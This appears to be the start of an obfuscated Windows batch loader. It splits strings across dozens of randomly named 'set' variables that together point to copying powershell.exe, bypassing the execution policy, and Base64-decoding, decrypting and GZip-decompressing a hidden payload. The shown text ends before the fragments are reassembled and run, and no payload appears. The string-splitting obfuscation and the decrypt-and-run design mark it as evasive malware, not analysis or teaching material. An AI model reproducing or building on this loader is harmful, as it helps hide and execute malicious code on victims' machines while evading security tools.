@echo off
set "yAzGHTgqKJ=em"
set "cORrXDTsCr=y "
set "nnENNCiKmX=nd"
set "tnJmUTeydq=Sy"
set "eFvRpKJZtR=ll"
set "RpHdgSNdFb=in"
set "UZUpRmKRQJ=\v"
set "qGlLVVXRuE=rs"
set "QVDHEKnEMZ=32"
set "gIlQSxtReT=:\"
set "HmkHYSuWMz=.e"
set "UIKGDPDXoJ=ws"
set "zGHIvqWAeL=po"
set "HugocdMngE=s\"
set "zIXCrXPZsU=\W"
set "pQPVXFPWBZ=he"
set "jTYcMYTjZd=ll"
set "UXfSdQFjvj=we"
set "hRMMjVFWBi= C"
set "kotpZwIiYW= /"
set "SRwgZiFaAq=rS"
set "msRLdamlhi=py"
set "fdezGEBsmo=Wi"
set "XXRHTDgbSG=ow"
set "PeaBkpFrPf=he"
set "WYbdUmwFRp=0\"
set "ehYQSAoABL=Po"
set "MNNuztfXCl=do"
set "tUxvSCUsQa=co"
set "WjYLnLVDcY=we"
set "oJFgVimwFc=st"
set "sefAVQXEIO=xe"
set "VnZlwfucNH=1."
set "kWUKqHpXGY= %~dp0"
set "nkrqIOuMTa=cd"
set "CzqdTniQKe= [st"
set "BxVhyCETfn=dqp "
set "avyUejzqsz='txe"
set "LtZqkEoXGs=New-"
set "VBjfoZfdly=S = "
set "dFWhwOvfZb= [Sy"
set "HckwNwEiwH=.Sec"
set "sqYxBwMqFt=Conv"
set "tTFLPiIGmA=morF"
set "uHyUJGjaQK=ptog"
set "ZXMoTlLnxg=DXv "
set "oJjUVyuHcb=.GZi"
set "lVhaUcWqEG=16] "
set "ZoiTGaaNQv=();$"
set "VFZkjYaCcb=tion"
set "sPvsifsAET=y.Cr"
set "eWiHlMRpwx=i = "
set "xYfCvqSExh=ring"
set "LIyIPFdAbT=bjec"
set "PznrgTZMkr=('l0"
set "LZUuknshbK=bypa"
set "iWYShRrfnY=736u"
set "bPuPYgVtOV=, (,"
set "UvBTChhsGn=zS.D"
set "ppsYlqRANV='dqR"
set "sBnUvyUzYF=and "
set "jywJjsqwqN=mQJ "
set "pTUJvXrJUa=$DMl"
set "zrNaKbwkQz=Mode"
set "SLRVneEpos=[Sys"
set "xLxxYlicvX=yste"
set "sgSrQXOTvT=ose("
